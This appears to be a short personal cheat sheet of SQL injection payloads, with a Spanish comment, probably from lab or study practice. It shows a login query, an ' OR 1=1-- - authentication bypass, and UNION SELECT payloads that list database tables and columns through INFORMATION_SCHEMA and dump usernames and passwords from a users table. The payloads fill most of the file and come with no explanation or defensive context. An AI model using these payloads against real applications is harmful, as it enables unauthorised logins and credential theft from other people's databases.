SELECT username, password FROM Users WHERE username = 'admin' AND password = 'admin'


SELECT user, password FROM users WHERE user = 'admin' AND password = '5f4dcc3b5aa765d61d8327deb882cf99'
SELECT user, password FROM users WHERE user = '' OR 1=1  -- -' AND password = '5f4dcc3b5aa765d61d8327deb882cf99'

-- -INYECCION: ' OR 1=1-- -


UNION SELECT TABLE_NAME, TABLE_SCHEMA, NULL FROM INFORMATION_SCHEMA.TABLES-- -

UNION SELECT COLUMN_NAME, TABLE_NAME, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'libros'-- -

UNION SELECT id, username, password FROM biblioteca.USERS-- -
